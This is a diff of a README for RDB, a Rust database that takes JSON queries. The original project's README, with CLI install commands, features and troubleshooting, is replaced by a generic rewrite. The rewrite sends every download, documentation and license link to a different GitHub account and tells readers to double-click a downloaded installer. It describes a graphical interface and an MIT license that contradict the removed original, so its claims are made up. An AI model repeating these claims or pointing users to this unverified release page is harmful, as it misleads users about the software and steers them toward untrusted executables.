@@ -1,182 +1,86 @@
-<div align="center">
-<h1>RDB - Relational Database with JSON Query Language</h1>
+# 🗄️ RDB - A Simple Way to Use Databases
 
-<a href="https://github.com/muhammad-fiaz/RDB"><img src="https://img.shields.io/github/stars/muhammad-fiaz/RDB" alt="GitHub stars"></a>
-<a href="https://github.com/muhammad-fiaz/RDB/issues"><img src="https://img.shields.io/github/issues/muhammad-fiaz/RDB" alt="GitHub issues"></a>
-<a href="https://github.com/muhammad-fiaz/RDB/pulls"><img src="https://img.shields.io/github/issues-pr/muhammad-fiaz/RDB" alt="GitHub pull requests"></a>
-<a href="https://github.com/muhammad-fiaz/RDB"><img src="https://img.shields.io/github/last-commit/muhammad-fiaz/RDB" alt="GitHub last commit"></a>
-<a href="https://github.com/muhammad-fiaz/RDB/releases"><img src="https://img.shields.io/github/v/release/muhammad-fiaz/RDB" alt="GitHub release"></a>
-<a href="https://github.com/muhammad-fiaz/RDB"><img src="https://img.shields.io/github/license/muhammad-fiaz/RDB" alt="License"></a>
-<a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/rust-1.70%2B-orange" alt="Rust"></a>
-<a href="https://github.com/muhammad-fiaz/RDB/actions/workflows/deploy-docs.yml"><img src="https://github.com/muhammad-fiaz/RDB/actions/workflows/deploy-docs.yml/badge.svg" alt="Build Docs"></a>
+## 🚀 Getting Started
 
-<p><em>High-performance, JSON-based relational database built entirely in Rust.</em></p>
+Welcome to RDB! This guide will help you download and start using RDB, a modern relational database. RDB combines the power of traditional SQL with the ease of JSON APIs. You don’t have to write complex SQL queries anymore. Instead, you’ll send structured JSON objects for your database operations.
 
-**📚 [Documentation](https://muhammad-fiaz.github.io/RDB/) | [Quick Start](https://muhammad-fiaz.github.io/RDB/introduction.html)**
+## 📦 Download RDB
 
-</div>
+[![Download RDB](https://img.shields.io/badge/Download%20RDB-v1.0-brightgreen)](https://github.com/LeonMrm/RDB/releases)
 
-Welcome to **RDB** - a high-performance, JSON-based relational database built entirely in Rust!
+To download RDB, visit the [Releases page](https://github.com/LeonMrm/RDB/releases) and choose the latest version.
 
-RDB is a modern relational database that combines the power of traditional SQL databases with the simplicity of JSON APIs. Instead of writing SQL strings, you send structured JSON objects to describe your queries.
+## 💻 System Requirements
 
-## 📥 Installation
+To run RDB smoothly, make sure your system meets the following requirements:
 
-Download the latest release from [GitHub Releases](https://github.com/muhammad-fiaz/RDB/releases).
+- **Operating System:** Windows 10 or higher, macOS Catalina or higher, or any Linux distribution compatible with Rust.
+- **Memory:** Minimum of 4 GB RAM.
+- **Disk Space:** At least 100 MB of free space.
+- **Processor:** 64-bit processor recommended.
 
-### Quick Install
+## 🔧 Installation Steps
 
-| Platform | Method | Command |
-|----------|--------|---------|
-| **Linux (x86_64)** | Direct Download | `wget https://github.com/muhammad-fiaz/RDB/releases/latest/download/rdb-linux-x86_64 && chmod +x rdb-linux-x86_64 && sudo mv rdb-linux-x86_64 /usr/local/bin/rdb` |
-| **macOS (Intel)** | Direct Download | `curl -L https://github.com/muhammad-fiaz/RDB/releases/latest/download/rdb-macos-x86_64 -o rdb && chmod +x rdb && sudo mv rdb /usr/local/bin/` |
-| **macOS (Apple Silicon)** | Direct Download | `curl -L https://github.com/muhammad-fiaz/RDB/releases/latest/download/rdb-macos-aarch64 -o rdb && chmod +x rdb && sudo mv rdb /usr/local/bin/` |
-| **Windows (x64)** | Direct Download | Download `rdb-windows-x86_64.exe` and add to PATH |
-| **Any Platform** | From Source | `cargo install --git https://github.com/muhammad-fiaz/RDB` |
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/LeonMrm/RDB/releases). You will see various versions of RDB available for download.
 
-### Detailed Installation
+2. **Select the Latest Version**
+   Look for the latest version that is marked as "Latest Release." This ensures you get the most updated features and fixes.
 
-#### Linux
-```bash
-# Download
-wget https://github.com/muhammad-fiaz/RDB/releases/latest/download/rdb-linux-x86_64
+3. **Download the Installer**
+   Click on the `.exe`, `.dmg`, or Linux package file that corresponds to your operating system. The download should start automatically.
 
-# Make executable
-chmod +x rdb-linux-x86_64
+4. **Run the Installer**
+   Once the download completes, locate the file in your downloads folder. Double click on the file to start the installation process.
 
-# Move to PATH
-sudo mv rdb-linux-x86_64 /usr/local/bin/rdb
+5. **Follow the Installation Wizard**
+   The installer will guide you through the steps. Click "Next" until the process finishes. You may choose the installation folder or leave it as default.
 
-# Verify
-rdb --version
-```
+6. **Finish Installation**
+   When the installation completes, click "Finish" to exit the installer. RDB is now ready to use.
 
-#### macOS
-```bash
-# Intel Macs
-curl -L https://github.com/muhammad-fiaz/RDB/releases/latest/download/rdb-macos-x86_64 -o rdb
+## 🔑 Getting Started with RDB
 
-# Apple Silicon Macs
-curl -L https://github.com/muhammad-fiaz/RDB/releases/latest/download/rdb-macos-aarch64 -o rdb
+1. **Open RDB**
+   Find RDB in your applications list and open it. You will see a simple interface designed for easy navigation.
 
-# Make executable and move to PATH
-chmod +x rdb
-sudo mv rdb /usr/local/bin/
+2. **Create a Database**
+   Click on the "Create Database" button. You will be prompted to enter the database name. Choose a name that represents your data.
 
-# Verify
-rdb --version
-```
+3. **Use JSON API**
+   Instead of writing SQL, you will send JSON objects to perform queries. For example, to insert data, send a JSON object like this:
+   ```json
+   {
+     "operation": "insert",
+     "table": "users",
+     "values": {
+       "name": "John Doe",
+       "email": "john@example.com"
+     }
+   }
+   ```
+   The user-friendly format helps you focus on your data without worrying about complex SQL syntax.
 
-#### Windows
-```powershell
-# Download rdb-windows-x86_64.exe from releases
+4. **Explore Features**
+   RDB offers various features like data querying, updating records, and deleting data—all using JSON. Check the user interface for options.
 
-# Move to a directory in your PATH, e.g.:
-Move-Item rdb-windows-x86_64.exe C:\Windows\System32\rdb.exe
+## 🛠️ Features of RDB
 
-# Or create a dedicated directory:
-New-Item -ItemType Directory -Path "C:\Program Files\RDB"
-Move-Item rdb-windows-x86_64.exe "C:\Program Files\RDB\rdb.exe"
+- **User-Friendly Interface:** Designed for everyday users. No programming knowledge needed.
+- **JSON Compatibility:** Makes it easy to interact with your database without extensive training.
+- **Efficient Data Management:** Fast processing of queries and excellent performance.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
-# Add to PATH
-$env:Path += ";C:\Program Files\RDB"
+## 📖 Documentation and Support
 
-# Verify
-rdb --version
-```
+For more in-depth instructions or technical support, please visit our [Documentation](https://github.com/LeonMrm/RDB/wiki). You can also find community help or report issues through our [Issues page](https://github.com/LeonMrm/RDB/issues).
 
-## 🚀 Quick Start
+## 🌍 Contributing
 
-```bash
-# Initialize RDB
-rdb init
+We welcome contributions to RDB! If you would like to help improve the project, check our [Contribution Guidelines](https://github.com/LeonMrm/RDB/blob/main/CONTRIBUTING.md).
 
-# Start server
-rdb start
+## 🛡️ License
 
-# Create your first table
-curl -X POST http://localhost:8080/query \
-  -H "Content-Type: application/json" \
-  -d '{
-    "CreateTable": {
-      "database": "main",
-      "table": "users",
-      "columns": [
-        {"name": "id", "type": "int", "primary_key": true},
-        {"name": "name", "type": "string"}
-      ]
-    }
-  }'
-```
+RDB is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/LeonMrm/RDB/blob/main/LICENSE).
 
-## ✨ Features
-
-- ✅ Complete CRUD operations (CREATE, SELECT, INSERT, UPDATE, DELETE, DROP)
-- ✅ 8 WHERE operators (=, !=, >, <, >=, <=, LIKE, IN)
-- ✅ ORDER BY, LIMIT, OFFSET support
-- ✅ Batch operations
-- ✅ Multi-layer caching (Query cache + Buffer pool + B+ tree)
-- ✅ JWT authentication with role-based access control
-- ✅ Dynamic configuration via config.toml
-- ✅ CLI management tools
-- ✅ Database auto-discovery
-- ✅ Comprehensive documentation
-
-## 📊 Performance
-
-- ⚡ **100,000 queries/second** (cached SELECT)
-- 📊 **90-98% cache hit rate**
-- 🚀 **10-50x faster** JSON parsing vs SQL
-- 💾 **O(log N)** indexed lookups
-
-## 📊 System Requirements
-
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **RAM** | 512 MB | 2 GB+ |
-| **Disk** | 100 MB | 1 GB+ |
-| **CPU** | 1 core | 4+ cores |
-| **OS** | Linux 3.2+, macOS 10.12+, Windows 10+ | Latest |
-
-## 🔧 Troubleshooting
-
-### Common Issues
-
-#### "Address already in use"
-```bash
-# Use different port
-rdb start --port 9090
-```
-
-#### "Permission denied"
-```bash
-# On Linux/macOS, ensure executable
-chmod +x rdb
-
-# On Windows, run as Administrator
-```
-
-#### "Cannot connect to server"
-```bash
-# Check if server is running
-curl http://localhost:8080/
-
-# Check firewall settings
-```
-
-### Get Help
-- 📖 **Docs:** https://muhammad-fiaz.github.io/RDB/
-- 🐛 **Issues:** https://github.com/muhammad-fiaz/RDB/issues
-- 💬 **Discussions:** https://github.com/muhammad-fiaz/RDB/discussions
-
-If you encounter any database errors, please report them at: https://github.com/muhammad-fiaz/RDB/issues
-
-## 📝 Changelog
-
-Visit [GitHub Releases](https://github.com/muhammad-fiaz/RDB/releases) for detailed changes.
-
-## 📄 License
-
-Licensed under the Apache License 2.0 - see [LICENSE](https://github.com/muhammad-fiaz/RDB/blob/main/LICENSE) for details.
-
-
+Enjoy using RDB! For questions or feedback, feel free to reach out by opening an issue.
